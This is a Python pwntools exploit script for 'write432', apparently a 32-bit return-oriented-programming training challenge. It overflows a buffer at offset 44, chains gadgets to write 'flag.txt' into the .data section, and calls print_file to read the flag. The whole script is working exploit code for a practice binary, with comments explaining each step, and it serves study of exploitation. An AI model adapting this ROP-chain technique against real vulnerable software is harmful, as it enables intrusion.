from pwn import *

elf = context.binary = ELF('./write432', checksec=False)
p = process()

rop = ROP(elf)

# Address of .data section (size=8 bytes)
data_section_address = elf.symbols.data_start

# We will pop address of .data section into edi
# Then pop the string (flag.txt) into ebp
pop_edi_pop_ebp = rop.find_gadget(["pop edi", "pop ebp", "ret"])[0]

# We will then move the string from ebp (flag.txt) into memory location stored in edi
mov_edi_ebp = elf.symbols.usefulGadgets  # Note: pwntools hides "non-trivial gadgets", docs advise using ropper/ROPGadget to list them all

# Write first 4 bytes (flag) to data section
rop.raw([pop_edi_pop_ebp, data_section_address, 'flag', mov_edi_ebp])
# Write second 4 bytes (.txt) to data (+ 4 bytes)
rop.raw([pop_edi_pop_ebp, data_section_address + 0x4, '.txt', mov_edi_ebp])
# Call print file function with data section address as param
rop.print_file(data_section_address)

# Chain it together (get the raw ROP bytes)
rop_chain = rop.chain()
info("rop chain: %r", rop_chain)

payload = flat({
    44: rop_chain
})

p.sendlineafter('>', payload)
p.recvuntil('Thank you!\n')

flag = p.recv()
success(flag)